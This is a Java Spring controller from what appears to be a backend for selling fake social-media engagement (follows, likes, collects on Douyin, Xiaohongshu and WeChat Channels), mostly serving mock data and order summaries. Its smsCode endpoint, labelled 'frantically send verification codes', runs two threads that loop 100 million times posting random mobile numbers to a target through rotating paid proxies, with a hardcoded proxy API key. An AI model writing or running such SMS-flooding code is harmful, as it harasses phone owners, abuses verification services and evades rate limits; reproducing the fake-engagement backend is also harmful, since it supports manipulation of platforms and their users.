package com.kakrolot.web.controller.impl;

import com.alibaba.fastjson.JSONObject;
import com.kakrolot.base.http.okhttp.OkHttpUtils;
import com.kakrolot.business.service.user.UserTokenService;
import com.kakrolot.redis.util.RedisUtil;
import com.kakrolot.service.dashboard.api.DashboardService;
import com.kakrolot.service.user.api.UserLoginRecordService;
import com.kakrolot.service.user.api.UserService;
import com.kakrolot.web.auth.annotations.Auth;
import com.kakrolot.web.controller.BaseController;
import com.kakrolot.web.model.WebResponse;
import com.kakrolot.web.model.mock.*;
import com.kakrolot.web.model.user.LoginModel;
import com.kakrolot.web.model.user.LoginResponse;
import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;
import okhttp3.Response;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

@RestController
@RequestMapping("/mock")
@Slf4j
public class MockController extends BaseController {

    @Autowired
    private UserService userService;

    @Autowired
    private RedisUtil redisUtil;

    @Value("${user.max.login.error.num:20}")
    private Long loginErrorNum;

    @Autowired
    private UserTokenService userTokenService;

    @Autowired
    private UserLoginRecordService userLoginRecordService;

    @Autowired
    private DashboardService dashboardService;

    @RequestMapping(value = "/login", method = RequestMethod.POST)
    @ResponseBody
    @ApiOperation(value = "登录", httpMethod = "POST")
    @Auth(isIntercept = false)
    public WebResponse<LoginResponse> login(@RequestBody LoginModel loginModel, HttpServletRequest request,
                                            HttpServletResponse response) {
        log.info("mock当前登录:" + loginModel);
        LoginResponse loginResponse = new LoginResponse();
        loginResponse.setToken("admin-token");
        return WebResponse.success(loginResponse);
    }

    @RequestMapping(value = "/userInfo", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "用户信息", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<UserResponse> userInfo(HttpServletRequest request,
                                              HttpServletResponse response) {
        log.info("mock获取当前用户");
        String headerToken = request.getHeader("X-Token");
        UserResponse userResponse = new UserResponse();
        userResponse.setAvatar("https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif");
        userResponse.setIntroduction("I am a super administrator");
        userResponse.setName("admin-Caoti");
        userResponse.setRoles(Arrays.asList("admin"));
        //menu 信息
        MenuResponse permissionMenu = MenuResponse.builder().path("/permission")
                .component("Layout").redirect("/permission/page").alwaysShow(true)
                .name("Permission").hidden(false).build();
        JSONObject permissionMeta = new JSONObject();
        permissionMeta.put("title", "Permission");
        permissionMeta.put("icon", "lock");
        permissionMenu.setMeta(permissionMeta);
        MenuResponse pageMenu = MenuResponse.builder().path("page").component("/permission/page")
                .redirect("noRedirect").hidden(false)
                .alwaysShow(false).name("PagePermission").build();
        JSONObject pagenMeta = new JSONObject();
        pagenMeta.put("title", "Page Permission");
        pageMenu.setMeta(pagenMeta);

        MenuResponse directiveMenu = MenuResponse.builder().path("directive").component("/permission/directive")
                .redirect("noRedirect").hidden(false)
                .name("DirectivePermission").alwaysShow(false).build();
        JSONObject directiveMeta = new JSONObject();
        directiveMeta.put("title", "Directive Permission");
        directiveMenu.setMeta(directiveMeta);

        List<MenuResponse> children = new ArrayList<>();
        children.add(pageMenu);
        children.add(directiveMenu);

        permissionMenu.setChildren(children);

        userResponse.setMenuList(Arrays.asList(permissionMenu));

        return WebResponse.success(userResponse);
    }

    @RequestMapping(value = "/userList", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "用户列表", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<MockUserModelPage> userList(@RequestParam("page") Integer page,
                                                   @RequestParam("limit") Integer limit,
                                                   @RequestParam("sort") String sort,
                                                   HttpServletRequest request,
                                                   HttpServletResponse response) {
        List<MockUserModel> userModelList = new ArrayList<>();
        int sumNum = 35;
        int pageTotal = 0;
        if (limit * page > sumNum) {
            pageTotal = sumNum - limit * (page - 1);
        } else {
            pageTotal = limit;
        }
        int startNum = (page - 1) * limit;
        for (int i = 0; i < pageTotal; i++) {
            final int random = (int) (Math.random() * 100);
            MockUserModel mockUserModel = MockUserModel.builder().tenant("租户" + (i + startNum))
                    .username("草薙00" + (i + startNum)).build();
            if (random % 2 == 1) {
                mockUserModel.setRole("管理员");
            } else {
                mockUserModel.setRole("普通用户");
            }
            userModelList.add(mockUserModel);
        }
        MockUserModelPage userModelPage = MockUserModelPage.builder().items(userModelList).total(sumNum).build();
        return WebResponse.success(userModelPage);
    }

    @RequestMapping(value = "/shopList", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "商品列表", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<MockShopModelPage> shopList(@RequestParam("name") String name,
                                                         @RequestParam("page") Integer page,
                                                         @RequestParam("limit") Integer limit,
                                                         @RequestParam("sort") String sort,
                                                         HttpServletRequest request,
                                                         HttpServletResponse response) {
        List<MockShopModel> shopModelList = new ArrayList<>();
        MockShopModel mockShopModel1 = MockShopModel.builder().name("电音关注").code("DY_FOLLOW").build();
        MockShopModel mockShopModel2 = MockShopModel.builder().name("电音点赞").code("DY_LOVE").build();
        shopModelList.add(mockShopModel1);
        shopModelList.add(mockShopModel2);
        MockShopModelPage mockShopModelPage = MockShopModelPage.builder().items(shopModelList).total(2).build();
        return WebResponse.success(mockShopModelPage);
    }


    @RequestMapping(value = "/tenantShopList", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "窗口列表", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<MockTenantShopModelPage> tenantShopList(@RequestParam("tenant") String tenant,
                                                               @RequestParam("page") Integer page,
                                                               @RequestParam("limit") Integer limit,
                                                               @RequestParam("sort") String sort,
                                                               HttpServletRequest request,
                                                               HttpServletResponse response) {
        List<MockTenantShopModel> tenantShopModelList = new ArrayList<>();
        int sumNum = 35;
        int pageTotal = 0;
        if (limit * page > sumNum) {
            pageTotal = sumNum - limit * (page - 1);
        } else {
            pageTotal = limit;
        }
        int startNum = (page - 1) * limit;
        for (int i = 0; i < pageTotal; i++) {
            final int random = (int) (Math.random() * 100);
            MockTenantShopModel mockTenantShopModel = MockTenantShopModel.builder()
                    .tenant(tenant + "租户" + (i + startNum))
                    .upperLimit(100 + (i + startNum)).lowerLimit(i)
                    .secretKey("密钥oa8932jhQMhDbfh3:" + (i + startNum)).price(new BigDecimal(10 + (i + startNum))).build();
            mockTenantShopModel.setId(Long.valueOf(i + startNum));
            if (random % 3 == 1) {
                mockTenantShopModel.setStatus("上架中");
                mockTenantShopModel.setTenant("点赞");
            } else if (random % 3 == 2) {
                mockTenantShopModel.setStatus("上架中");
                mockTenantShopModel.setTenant("关注");
            } else {
                mockTenantShopModel.setStatus("下架");
                mockTenantShopModel.setTenant("播放");
            }
            tenantShopModelList.add(mockTenantShopModel);
        }
        MockTenantShopModelPage tenantShopModelPage = MockTenantShopModelPage.builder().items(tenantShopModelList).total(sumNum).build();
        return WebResponse.success(tenantShopModelPage);
    }

    @RequestMapping(value = "/orderModelList", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "订单列表", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<MockOrderModelPage> orderModelList(@RequestParam("username") String username,
                                                          @RequestParam("page") Integer page,
                                                          @RequestParam("limit") Integer limit,
                                                          @RequestParam("sort") String sort,
                                                          HttpServletRequest request,
                                                          HttpServletResponse response) {
        List<MockOrderModel> orderModelList = new ArrayList<>();
        int sumNum = 35;
        int pageTotal = 0;
        if (limit * page > sumNum) {
            pageTotal = sumNum - limit * (page - 1);
        } else {
            pageTotal = limit;
        }
        int startNum = (page - 1) * limit;
        for (int i = 0; i < pageTotal; i++) {
            final int random = (int) (Math.random() * 100);
            MockOrderModel mockOrderModel = MockOrderModel.builder().username(username + "草薙:" + (i + startNum))
                    .orderUrl("点赞:https://www.iesdouyin.com/share/video/6801878177091226895")
                    .initNum(23 + (i + startNum)).endNum(200 + (i + startNum))
                    .orderAmount(new BigDecimal(1000 + (i + startNum))).build();
            if (random % 3 == 0) {
                mockOrderModel.setStatus("进行中");
            } else if (random % 3 == 1) {
                mockOrderModel.setStatus("已退单");
            } else {
                mockOrderModel.setStatus("已完成");
            }
            orderModelList.add(mockOrderModel);
        }
        MockOrderModelPage orderModelPage = MockOrderModelPage.builder().items(orderModelList).total(sumNum).build();
        return WebResponse.success(orderModelPage);
    }

    @RequestMapping(value = "/accountDetailModelList", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "个人账户明细", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<MockAccountDetailModelPage> accountDetailModelList(@RequestParam("page") Integer page,
                                                                          @RequestParam("limit") Integer limit,
                                                                          @RequestParam("sort") String sort,
                                                                          HttpServletRequest request,
                                                                          HttpServletResponse response) {
        List<MockAccountDetailModel> accountDetailModelList = new ArrayList<>();
        int sumNum = 35;
        int pageTotal = 0;
        if (limit * page > sumNum) {
            pageTotal = sumNum - limit * (page - 1);
        } else {
            pageTotal = limit;
        }
        int startNum = (page - 1) * limit;
        for (int i = 0; i < pageTotal; i++) {
            MockAccountDetailModel accountDetailModel = MockAccountDetailModel.builder().amount(new BigDecimal(300 + (i + startNum)))
                    .balanceAmount(new BigDecimal(1000 + (i + startNum))).operator("草薙" + (i + startNum)).build();
            accountDetailModelList.add(accountDetailModel);
        }
        MockAccountDetailModelPage accountDetailModelPage = MockAccountDetailModelPage.builder().total(sumNum).items(accountDetailModelList).build();
        return WebResponse.success(accountDetailModelPage);
    }

    @RequestMapping(value = "/accountModelList", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "账户管理", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<MockAccountModelPage> accountModelList(@RequestParam("username") String username,
                                                              @RequestParam("page") Integer page,
                                                              @RequestParam("limit") Integer limit,
                                                              @RequestParam("sort") String sort,
                                                              HttpServletRequest request,
                                                              HttpServletResponse response) {
        List<MockAccountModel> accountModelList = new ArrayList<>();
        int sumNum = 35;
        int pageTotal = 0;
        if (limit * page > sumNum) {
            pageTotal = sumNum - limit * (page - 1);
        } else {
            pageTotal = limit;
        }
        int startNum = (page - 1) * limit;
        for (int i = 0; i < pageTotal; i++) {
            final int random = (int) (Math.random() * 100);
            MockAccountModel accountModel = MockAccountModel.builder().amount(new BigDecimal(1000 + (i + startNum)))
                    .username(username + "草薙" + (i + startNum)).build();
            if (random % 2 == 1) {
                accountModel.setStatus("正常");
            } else {
                accountModel.setStatus("冻结中");
            }
            accountModelList.add(accountModel);
        }
        MockAccountModelPage accountModelPage = MockAccountModelPage.builder().total(sumNum).items(accountModelList).build();

        return WebResponse.success(accountModelPage);
    }

    @RequestMapping(value = "/smsCode", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "狂发验证码", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<String> smsCode() {
        String url = "https://baidu.com";
        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger failCount = new AtomicInteger(0);
        new Thread(() -> {
            for(int i=0;i<100000000;i++) {
                String tel = getTel();
                try {
                    JSONObject param = new JSONObject();
                    param.put("shared_id","29tzt62ttajixpys");
                    param.put("username",getTel());
                    String ip = getIp();
                    Response response = OkHttpUtils.doPostByProxy(url, param,"application/x-www-form-urlencoded",null,ip);
                    String result = response.body().string();
                    int count = successCount.incrementAndGet();
                    log.info("sms1成功:{},手机号:{};返回值:{};ip:{}",count,tel,result,ip);
//                        Thread.sleep(500);
                } catch (Exception e) {
                    int count = failCount.incrementAndGet();
                    log.info("sms1失败:{},手机号:{};错误:{};",count,tel,e.toString());
                }
            }
        }).start();
        new Thread(() -> {
            for(int i=0;i<100000000;i++) {
                String tel = getTel();
                try {
                    JSONObject param = new JSONObject();
                    param.put("shared_id","29tzt62ttajixpys");
                    param.put("username",getTel());
                    String ip = getIp();
                    Response response = OkHttpUtils.doPostByProxy(url, param,"application/x-www-form-urlencoded",null,ip);
                    String result = response.body().string();
                    int count = successCount.incrementAndGet();
                    log.info("sms2成功:{},手机号:{};返回值:{};ip:{}",count,tel,result,ip);
//                        Thread.sleep(500);
                } catch (Exception e) {
                    int count = failCount.incrementAndGet();
                    log.info("sms2失败:{},手机号:{};错误:{};",count,tel,e.toString());
                }
            }
        }).start();
        return WebResponse.success("成功");
    }

    private String[] telFirst = "134,135,136,137,138,139,150,151,152,157,158,159,130,131,132,155,156,133,153".split(",");

    public String getTel() {
        int index = getNum(0, telFirst.length - 1);
        String first = telFirst[index];
        String second = String.valueOf(getNum(1, 888) + 10000).substring(1);
        String third = String.valueOf(getNum(1, 9100) + 10000).substring(1);
        return first + second + third;
    }

    public int getNum(int start, int end) {
        return (int) (Math.random() * (end - start + 1) + start);
    }

    private String[] ipSplits;
    private int counts = 0;
    public String getIp(){
        try {
            if(counts>=30) {
                counts=0;
            }
            if(counts == 0 || ipSplits == null) {
                Response response = OkHttpUtils.doGet("http://www.zdopen.com/CotenancyProxy/GetIP/?api=202006251620408787&akey=276d0fcc4b8fcd1a&pro=1&timespan=0&order=2&type=1", null);
                String result = response.body().string();
                ipSplits = result.split("\r\n");
                int index = (int) System.currentTimeMillis() % ipSplits.length;
                counts++;
                return ipSplits[index];
            } else {
                int index = (int) System.currentTimeMillis() % ipSplits.length;
                counts++;
                return ipSplits[index];
            }
        } catch (Exception e) {
            return "";
        }
    }


    @RequestMapping(value = "/current/zm/xhs/orderInfo", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "当前xhs订单汇总", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<List<String>> xhsOrderInfo(HttpServletRequest request,
                                                  HttpServletResponse response) {
        Long xhsFollowCount = dashboardService.findOrderRecordCountSummaryByBusinessType("XHS_FOLLOW").getTotalCount();
        Long xhsFollowNum = dashboardService.findOrderRecordNumSummaryByBusinessType("XHS_FOLLOW").get(0).getTotalNum();
        Long xhsLowFollowCount = dashboardService.findOrderRecordCountSummaryByBusinessType("XHS_LOW_FOLLOW").getTotalCount();
        Long xhsLowFollowNum = dashboardService.findOrderRecordNumSummaryByBusinessType("XHS_LOW_FOLLOW").get(0).getTotalNum();
        Long xhsCollectCount = dashboardService.findOrderRecordCountSummaryByBusinessType("XHS_COLLECT").getTotalCount();
        Long xhsCollectNum = dashboardService.findOrderRecordNumSummaryByBusinessType("XHS_COLLECT").get(0).getTotalNum();
        Long xhsLoveCount = dashboardService.findOrderRecordCountSummaryByBusinessType("XHS_LOVE").getTotalCount();
        Long xhsLoveNum = dashboardService.findOrderRecordNumSummaryByBusinessType("XHS_LOVE").get(0).getTotalNum();
        /*Long xhsFollowCount = 0L;
        Long xhsFollowNum = 0L;
        Long xhsLowFollowCount = 0L;
        Long xhsLowFollowNum = 0L;
        Long xhsCollectCount = 0L;
        Long xhsCollectNum = 0L;
        Long xhsLoveCount = 0L;
        Long xhsLoveNum = 0L;*/
        List<String> xhsOrderInfos  = new ArrayList<>();
        xhsOrderInfos.add("小红薯关注:"+xhsFollowCount+",总量:"+xhsFollowNum);
        xhsOrderInfos.add("小红薯低价关注:"+xhsLowFollowCount+",总量:"+xhsLowFollowNum);
        xhsOrderInfos.add("小红薯收藏:"+xhsCollectCount+",总量:"+xhsCollectNum);
        xhsOrderInfos.add("小红薯点赞:"+xhsLoveCount+",总量:"+xhsLoveNum);
        return WebResponse.success(xhsOrderInfos);
    }

    @RequestMapping(value = "/current/zm/minXhs/orderInfo", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "当前最低价xhs订单汇总", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<List<String>> minXhsOrderInfo(HttpServletRequest request,
                                                  HttpServletResponse response) {
        Long xhsFollowCount = dashboardService.findOrderRecordCountSummaryByBusinessType("XHS_MIN_FOLLOW").getTotalCount();
        Long xhsFollowNum = dashboardService.findOrderRecordNumSummaryByBusinessType("XHS_MIN_FOLLOW").get(0).getTotalNum();
        Long xhsCollectCount = dashboardService.findOrderRecordCountSummaryByBusinessType("XHS_MIN_COLLECT").getTotalCount();
        Long xhsCollectNum = dashboardService.findOrderRecordNumSummaryByBusinessType("XHS_MIN_COLLECT").get(0).getTotalNum();
        Long xhsLoveCount = dashboardService.findOrderRecordCountSummaryByBusinessType("XHS_MIN_LOVE").getTotalCount();
        Long xhsLoveNum = dashboardService.findOrderRecordNumSummaryByBusinessType("XHS_MIN_LOVE").get(0).getTotalNum();
        /*Long xhsFollowCount = 0L;
        Long xhsFollowNum = 0L;
        Long xhsLowFollowCount = 0L;
        Long xhsLowFollowNum = 0L;
        Long xhsCollectCount = 0L;
        Long xhsCollectNum = 0L;
        Long xhsLoveCount = 0L;
        Long xhsLoveNum = 0L;*/
        List<String> xhsOrderInfos  = new ArrayList<>();
        xhsOrderInfos.add("最低价小红薯关注:"+xhsFollowCount+",总量:"+xhsFollowNum);
        xhsOrderInfos.add("最低价小红薯收藏:"+xhsCollectCount+",总量:"+xhsCollectNum);
        xhsOrderInfos.add("最低价小红薯点赞:"+xhsLoveCount+",总量:"+xhsLoveNum);
        return WebResponse.success(xhsOrderInfos);
    }

    @RequestMapping(value = "/current/vx/orderInfo", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "当前vx订单汇总", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<List<String>> vxOrderInfo(HttpServletRequest request,
                                                  HttpServletResponse response) {
        Long vxLoveCount = dashboardService.findOrderRecordCountSummaryByBusinessType("VX_LOVE").getTotalCount();
        Long vxLoveNum = dashboardService.findOrderRecordNumSummaryByBusinessType("VX_LOVE").get(0).getTotalNum();
        Long vxCollectCount = dashboardService.findOrderRecordCountSummaryByBusinessType("VX_COLLECT").getTotalCount();
        Long vxCollectNum = dashboardService.findOrderRecordNumSummaryByBusinessType("VX_COLLECT").get(0).getTotalNum();
        Long vxFollowCount = dashboardService.findOrderRecordCountSummaryByBusinessType("VX_FOLLOW").getTotalCount();
        Long vxFollowNum = dashboardService.findOrderRecordNumSummaryByBusinessType("VX_FOLLOW").get(0).getTotalNum();
        List<String> vxOrderInfos  = new ArrayList<>();
        vxOrderInfos.add("视频号点赞:"+vxLoveCount+",总量:"+vxLoveNum);
        vxOrderInfos.add("视频号收藏:"+vxCollectCount+",总量:"+vxCollectNum);
        vxOrderInfos.add("视频号关注:"+vxFollowCount+",总量:"+vxFollowNum);
        return WebResponse.success(vxOrderInfos);
    }


    @RequestMapping(value = "/current/dy/orderInfo", method = RequestMethod.GET)
    @ResponseBody
    @ApiOperation(value = "当前dy订单汇总", httpMethod = "GET")
    @Auth(isIntercept = false)
    public WebResponse<List<String>> dyOrderInfo(HttpServletRequest request,
                                                  HttpServletResponse response) {
        Long batchLoveCount = dashboardService.findOrderRecordCountSummaryByBusinessType("BATCH_LOVE").getTotalCount();
        Long batchLoveNum = dashboardService.findOrderRecordNumSummaryByBusinessType("BATCH_LOVE").get(0).getTotalNum();
        Long batchFollowCount = dashboardService.findOrderRecordCountSummaryByBusinessType("BATCH_FOLLOW").getTotalCount();
        Long batchFollowNum = dashboardService.findOrderRecordNumSummaryByBusinessType("BATCH_FOLLOW").get(0).getTotalNum();
        List<String> xhsOrderInfos  = new ArrayList<>();
        xhsOrderInfos.add("电音点赞:"+batchLoveCount+",总量:"+batchLoveNum);
        xhsOrderInfos.add("电音关注:"+batchFollowCount+",总量:"+batchFollowNum);
        return WebResponse.success(xhsOrderInfos);
    }


}
